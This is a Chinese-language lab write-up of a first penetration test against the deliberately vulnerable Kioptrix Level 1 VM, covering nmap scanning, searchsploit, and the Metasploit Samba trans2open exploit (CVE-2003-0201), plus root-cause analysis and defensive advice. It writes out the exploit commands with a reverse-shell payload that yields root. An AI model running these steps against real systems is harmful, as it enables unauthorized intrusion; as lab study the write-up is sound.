# 01 · 第一次完整渗透实战：Kioptrix Level 1

> 日期：2026-09-21 | 标签：#渗透测试 #VulnHub #实战 #靶机

## 1. 概述

这是第一次完整走完渗透测试流程：从环境搭建、信息收集、漏洞发现，到远程溢出利用、获取 root 权限。

| 项目 | 内容 |
|---|---|
| 靶机 | Kioptrix Level 1（VulnHub） |
| 目标 IP | 192.168.80.130 |
| 攻击机 | Kali Linux（192.168.80.129） |
| 环境 | VMware Workstation Pro，NAT 网络 |
| 使用工具 | nmap、searchsploit、Metasploit |
| 最终成果 | 获取 root 权限（uid=0） |

## 2. 环境搭建（踩坑记录）⭐

这是最花时间的一步，踩了不少坑：

| 问题 | 原因 | 解决 |
|---|---|---|
| Kali 扫不到靶机 | 两台虚拟机网络模式不一致（靶机是桥接，Kali 是 NAT） | 统一改为 **NAT** |
| 界面里改成 NAT，一启动又变回桥接 | 设置没写入配置文件 | **直接编辑 `.vmx` 文件**：`ethernet0.connectionType = "nat"` |

**⚠️ 最重要的教训**：
> 做渗透前，**先搞清楚自己 IP、目标 IP、网段是否一致**，否则后面全是白费功夫。

## 3. 信息收集

```bash
sudo nmap -sV -T4 192.168.80.130
```

扫描结果：

| 端口 | 服务 | 版本 |
|---|---|---|
| 22/tcp | SSH | OpenSSH 2.9p2 (protocol 1.99) |
| 80/tcp | HTTP | Apache httpd 1.3.20 + mod_ssl/2.8.4 + OpenSSL/0.9.6b |
| 111/tcp | rpcbind | RPC #100000 |
| 139/tcp | netbios-ssn | Samba smbd (workgroup: MYGROUP) |
| 443/tcp | HTTPS | Apache/1.3.20 + mod_ssl/2.8.4 + OpenSSL/0.9.6b |
| 1024/tcp | status | RPC #100024 |

**分析**：所有服务都是 2001 年前后的老版本，存在大量已公开漏洞。

## 4. 漏洞发现

```bash
searchsploit apache 1.3.20
```

发现两个高危远程漏洞：

1. **Apache mod_ssl < 2.8.7 - OpenFuck 远程缓冲区溢出**（`unix/remote/764.c` 等）
2. **Samba 2.2.x - trans2open 远程缓冲区溢出**（CVE-2003-0201）

## 5. 漏洞利用（Metasploit - Samba trans2open）

```bash
msfconsole
```

```text
search trans2open
use exploit/linux/samba/trans2open
set RHOSTS 192.168.80.130
set LHOST 192.168.80.129
set PAYLOAD linux/x86/shell_reverse_tcp
show targets
run
```

参数说明：

| 参数 | 值 | 含义 |
|---|---|---|
| RHOSTS | 192.168.80.130 | 靶机 IP |
| LHOST | 192.168.80.129 | 攻击机 IP（接收反弹 shell） |
| PAYLOAD | linux/x86/shell_reverse_tcp | 反弹 shell |

结果：

```text
[*] Command shell session 1 opened
```

## 6. 成果验证

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=99(nobody)
```

**已获取目标主机的最高权限（uid=0）**，可读取任意文件（如 `/etc/shadow`）。

## 7. 漏洞原理

| 项目 | 说明 |
|---|---|
| 漏洞编号 | CVE-2003-0201 |
| 漏洞类型 | 远程缓冲区溢出（RCE） |
| 受影响函数 | Samba 的 `call_trans2open()` |
| 根本原因 | 处理 SMB 请求时未校验输入长度，导致栈溢出、可覆盖返回地址 |
| 为什么直接拿到 root | **smbd 服务本身以 root 权限运行** |
| 危害等级 | 严重（Critical）—— 无需认证即可远程获取最高权限 |

**核心认知**：
> 老版本 Samba 存在溢出漏洞，而服务又以 root 运行 →
> 溢出成功 = 直接获得 root 权限。
> 这也是为什么"**网络服务不要用 root 运行**"是安全铁律。

## 8. 完整流程回顾

```text
① 信息收集   → nmap 扫端口、识别服务版本
② 漏洞发现   → searchsploit 用版本号查已知漏洞
③ 漏洞利用   → Metasploit 运行 exploit，拿到反弹 shell
④ 权限获取   → 验证 uid=0，确认是 root
```

## 9. 防御建议

1. **立即升级 Samba** 到最新稳定版本
2. 用防火墙限制 139/445 端口，只允许可信 IP 访问
3. **网络服务以最小权限运行**，禁止用 root 启动

## 10. 我的理解

- 第一次真正体会到"版本号就是漏洞线索"
- 环境搭建占了 80% 的时间，真正的"攻击"只用了几分钟

## 11. 合规提醒

**本次测试对象是我自己在本地搭建的靶机，属于合法授权测试。**

- ✅ 可以测试：自己的设备、自建靶场
- ❌ 绝对禁止：他人的电脑、学校/公司网络、任何未授权系统
